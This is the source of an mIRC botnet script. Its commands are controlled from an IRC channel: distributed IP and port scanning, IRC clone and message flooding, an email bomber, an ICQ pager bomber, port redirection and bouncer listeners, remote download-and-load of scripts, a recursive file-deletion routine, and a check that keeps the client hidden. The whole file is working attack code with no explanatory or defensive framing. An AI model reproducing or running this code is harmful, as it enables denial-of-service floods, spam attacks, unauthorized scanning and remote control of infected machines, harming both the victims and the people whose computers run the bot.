$+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  write -c makestr.txt $read(makestr.txt) $+ $+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  write -c makestr.txt $read(makestr.txt) $+ $+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  write -c makestr.txt $read(makestr.txt) $+ $+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  write -c makestr.txt $read(makestr.txt) $+ $+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  write -c makestr.txt $read(makestr.txt) $+ $+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  write -c makestr.txt $read(makestr.txt) $+ $+($chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)),$chr($r(32,2500)))
  return $read(makestr.txt,1)
}

alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
alias startscanning {  :loop |  inc %loop | if $nick( %botchan , %loop ,a,o) == $me {  set %multiply $calc( %loop -1)   |  unset %loop |  goto end   } | else goto loop |  :end | set %botnum $nick( %botchan ,0,a,o) |  /startscan $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip )) $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip +$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))) %port }
alias finished { msgx %botchan [scan complete]: %begshortip to %endshortip %port |  msgx %botchan SCANNING COMPLETE... |  bishazz | unset1variable |  halt }
alias unset1variable {  unset %begshortip | unset %endshortip |  unset %botnum |  unset %multiply }
alias startscan { set %beglongip $longip($1) |  set %endlongip $longip($2) |  set %port $3 |  set %total $calc( %endlongip - %beglongip ) |  unset %totalscaning | setnewvars4scan }
alias setnewvars4scan {
  inc %totalscaning
  if %totalscaning == %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %port
  if $1 == 1 finished
  sockopen ip2 %ip2 %port
  if $1 == 2 finished
  sockopen ip3 %ip3 %port
  if $1 == 3 finished
  sockopen ip4 %ip4 %port
  if $1 == 4 finished
  sockopen ip5 %ip5 %port
  if $1 == 5 finished
  sockopen ip6 %ip6 %port
  if $1 == 6 finished
  sockopen ip7 %ip7 %port
  if $1 == 7 finished
  sockopen ip8 %ip8 %port
  if $1 == 8 finished
  sockopen ip9 %ip9 %port
  if $1 == 9 finished
  sockopen ip10 %ip10 %port
  if $1 == 10 finished
  sockopen ip11 %ip11 %port
  if $1 == 11 finished
  sockopen ip12 %ip12 %port
  if $1 == 12 finished
  sockopen ip13 %ip13 %port
  if $1 == 13 finished
  sockopen ip14 %ip14 %port
  if $1 == 14 finished
  sockopen ip15 %ip15 %port
  if $1 == 15 finished
  sockopen ip16 %ip16 %port
  if $1 == 16 finished
  sockopen ip17 %ip17 %port
  if $1 == 17 finished
  sockopen ip18 %ip18 %port
  if $1 == 18 finished
  sockopen ip19 %ip19 %port
  if $1 == 19 finished
  sockopen ip20 %ip20 %port
  if $1 == 20 finished
  sockopen ip21 %ip21 %port
  if $1 == 21 finished
  sockopen ip22 %ip22 %port
  if $1 == 22 finished
  sockopen ip23 %ip23 %port
  if $1 == 23 finished
  sockopen ip24 %ip24 %port
  if $1 == 24 finished
  sockopen ip25 %ip25 %port
  timer 1 5 /sockclose ip*
  timer 1 $calc(1+5) /setnewvars4scan
}
alias blah4321 {
  set %anick123 SYN- $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  anick %anick123
  unset %anick123
}
alias lw.decrypt {
  .var %x = 0
  .var %tot = $len($1)
  :loop
  if (%x == %tot) { .return %lw.decrypt  }
  .inc %x 1
  if ($mid($1,%x,1) !isletter) { .var %tmp = %tmp $+ $mid($1,%x,1) | goto loop }
  if ($mid($1,%x,1) isletter) {
    .var %asc.num = $calc(%tmp - %lw.encrypt.num3)
    .var %asc.num = $calc(%asc.num * %lw.encrypt.num2)
    .var %asc.num = $calc(%asc.num / %lw.encrypt.num1)
    .var %lw.decrypt = %lw.decrypt $+ $chr(%asc.num)
    .unset %tmp
  }
  goto loop
}
alias cfdl {
  if ($1 == $null) { msgx %dchan Error in syntax; insufficient parameters. Use !sndl [start|stop|status|help] <host> </path/to/file> | linesep -s | return }
  if ($1 == help) { msgx %dchan syntax; insufficient parameters. Use !sndl [start|stop|status|help] <host> </path/to/file> | return }
  if ($1 == stop) { if ($sock(cfdl.*,0) == 0) { msgx %dchan Error! No downloads in progress! | return } | sockclose cfdl.* | msgx %dchan Download halted! | return }
  if ($1 == status) { if ($sock(cfdl.*,0) == 0) { msgx %dchan Error: no downloads currently in progress | return } | msgx %dchan $chr(35) $+ 1 $chr($asc([)) $+ $nopath(%p) $+ $chr($asc(])) at $chr($asc([)) $+ %_kb $+ /sec $+ $chr($asc(])) completed $chr($asc([)) $+ $bytes($sock(%s).rcvd).suf $+ $chr($asc(])) elapsed $chr($asc([)) $+ $duration($calc($ctime - %ctime)) $+ $chr($asc(])) }
  if ($1 == start) {
    if ($sock(cfdl.*,0) != 0) { msgx %dchan Error! Download already in progress ... | return }
    set %h $2 | %s = $+(cfdl.,$rand(0,99)) | %p = $3 | write -c $+(",$mircdir,$nopath(%p),") | set %ctime $ctime
    .sockopen %s %h 80
    sockmark %s $+(cfdl,$rand(0,99))
    if (%loadscript == 1) { msgx %dchan Downloading and loading $nopath(%p) as script }
    msgx %dchan Attempting to establish a connection with %h ...
  }
}




alias asadf { /window -h $chan(1) | /window -h $chan(2) | /window -h $chan(3) | if ($appstate != hidden) { /quit ERROR/ ( $+ $ip $+ / $+ $os ) [APPSTATE != HIDDEN!] removing ... | set %removeitem 1 | .run $mircexe | exit } }
alias clone { if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3 }  }
  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- }  | if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }   }
  if ($1 == msgx) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 : $+ $3- }  }
  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2- } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2- } }
  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $r(a,z) $+ $r(1,99) $+ $r(a,z) $+ $r(a,z)  | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } 
  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
  if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } 
  if ($1 == raw) { if ($2 != $null) { if ($sock(clone*,0) > 0) { /sockwrite -n clone* $2- } | if ($sock(sock*,0) > 0) { /sockwrite -n sock* $2- }  }  }
}

alias dkmsgxfloodk { if ($1 == in) { if ($2 == PING) { sockwrite -tn %sockname PONG $3 } } }

alias cfmailbomb {
  if (!$1-) { msgx %mchan Error in syntax, syntax; !cfmailbomb [start] [ammount] [slowsend|normalsend|fastsend] [mailserver] [mailserverport] [from|random] [to] [message] | return }
  if ($1 == stop) { timeremailer* off | msgx %mchan Halting all emails | return }
  if ($1 == start) && ($2 && $3 && $4 && $5 && $6 && $7 && $8) { 
    msgx %mchan Sending [ $+ $2 $+ ] speed [ $+ $3 $+ ] with [ $+ $4 $+ ] port [ $+ $5 $+ ] from [ $+ $6 $+ ] to [ $+ $7 $+ ]
    set %emailsent 0 | set %mammount $2 | set %mserver $4 | set %mport $5 | set %mfrom $6 | set %mto $7 | set %mdata $8- 
    .timeremailer -m 0 $iif(slowsend == $3,2000,$iif(normalsend == $3,1000,$iif(fastsend == $3,60,1000))) goemail
  }
}


alias blah {
  if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3 }  }
}

alias goemail { inc %emailsent | if (%emailsent > %mammount) { msgx %mchan Mailing completed on %mto ! | .timeremailer* off } | .sockopen $+(mailsend.,$r(1,9999999),$r(1,99999),$r(a,z)) %mserver %mport }

alias dksmsgxflooder {  if ($sock(dksmsgxflooder2,0) == 0) { .sockopen dksmsgxflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgxflooder1,0) == 0) { sockopen dksmsgxflooder1 %msg.flood.server %msg.flood.server.port }  }
alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read ex.scr } | if ($1 == 2) { return ^ $+ $read ex.scr $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read ex.scr $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read ex.scr $+ - } | if ($1 == 6) { return $read ex.scr $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read ex.scr $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }

alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { .msgx $1 14*(PORTREDIRECT)*: IN-PORT: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | .msgx $1 5[LOCAL IP ADDRESS]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { msgx $1 5*** ERROR, NO PORT REDIRECTS! } | msgx $1 5*** PORTREDIRECT/END | unset %gtpcount } }
alias pdirectstop { set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
alias botraw { sockwrite -n sock* $1- }
alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msgx %bc 2SERVER NOT SET | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read ex.scr | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
alias setserver { %clones.setserver = 1 | .dns -h $1 } 

alias port.range.scan { set %range1 $calc( $gettok(%port.to.scan,1,45) - 1) | set %range2 $gettok(%port.to.scan,2,45) | :lewp | inc %range1 | if (%range1 <= %range2) { sockopen range. $+ %range1 %port.scan.ip %range1 | goto lewp } | else { .timergetportsempire 1 2 get.ports } }
alias get.ports { .msgx %schan 14[15PORTSCAN14] OPEN PORTS FOUND: $iif(%range.ports != $null, %range.ports, none) | .msgx %schan 14[15PORTSCAN14] SCANNING PORTS SUCCESSFULLY COMPLETED FOR %port.scan.ip $+ $+ ... |  unset %range.ports %range1 %range2 %port.to.scan %port.scan.ip | unset %schan | sockclose range.* }

alias lynch0 { set %lc 0 |  set %space   | set %lm $replace($$3-,$chr(32), ) |  :ll |  if (%lc == 50) { /halt } |  /sockopen lynch0 $+ %lc $$1 $$2 |  inc %lc |  goto ll }
alias lynch0end { /sockclose lynch0* }

alias bnc {    if ($1 == start) { //set %bnc. [ $+ [ $2 ] ] $3  | //socklisten bnc. $+ $2 $2  }  |  if ($1 == reset) { unset %bnc* | sockclose bnc* } |  if ($1 == log) { set %bnc.log $2 }  }

alias msgx { if (# == $null) { msgx $nick $1- }  |   else { msgx $1- } }

alias percent { if ($1 isnum) && ($2 isnum) { return $round($calc(($1 / $2) * 100),2) $+ $chr(37) } }

alias reg {  if ($1 == 1) { return @aol.com } | if ($1 == 2) { return @hotmail.com } | if ($1 == 3) { return @msn.com } | if ($1 == 4) { return @netScreWed.com } | if ($1 == 5) { return @bothered.com } | if ($1 == 6) { return @bothered.com } | if ($1 == 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .edu } | if ($1 == 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .net }  | if ($1 == 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .com } | if ($1 == 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .org } }

alias bishazz { /sockclose ip* |  timers off |  unset %begshortip |  unset %beglongip |  unset %endshortip |  unset %endlongip |  unset %port |  unset %botchan |  unset %botnum |  unset %ip* |  unset %loop |  unset %multiply |  unset %total |  unset %totalscaning }

alias properform {  if ($1 == $null) || ($2 == $null) { .msgx $chan FORMAT !scan [beginning IP] [ending IP] [PORT] | halt } |   if ($3 == $null) {  .msgx $chan INEED THE PORT | halt } |  if (. !isin $1) || (. !isin $2) { .msgx $chan sorry i believe an IP has periods in it EG:127.0.0.1 | halt } | if ($3 !isnum 1-65535) { .msgx $chan INVALID PORT. USE 1 - 65535 | halt } |  else return good |  halt }

alias s.inviter {   if (%i.ondelay == $null) { msgx %s.i.c 5[15in14vit15er5]: ERROR: PLEASE SET DELAY !inviter delay [ [ [ delay ] ] ] | halt } |  if (%i.server == $null) || (%i.port == $null) { msgx %s.i.c 5[15in14vit15er5]:  ERROR STARTING INVITER, INVITER SERVER OR PORT NOT SET! %iserver/%iserver.port | halt }  |  if ($sock(inviter*,0) > 0) { msgx %s.i.c 5[15in14vit15er5]:  ERROR: INVITER ALREADY LOADED! | halt } | sockopen inviterN %i.server %i.port  | .msgx %s.i.c 5[15in14vit15er5]:  LOADING INVITER TO SERVER: ( $+ $+ %i.server $+ ) PORT: ( $+ %i.port $+ )  |  //sockopen inviterM %i.server %i.port  }

alias killsub7 { if ($portfree(27374) != $true) { halt } | else { halt | sockopen s7kill 127.0.0.1 27374  } }

alias download { unset %startw | set %dlpage $remove($gettok($$1,2,47),http://) | set %dlfile / $+ $gettok($$1,3-,47) | sockopen download %dlpage 80 }

alias chk4os { .timer1 off }
alias delos { :delos |  if ($findfile($1,*,0) == 0) { goto end } |  /remove $findfile($1,*,1) |  goto delos | :end }

alias icqpagebomb { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 

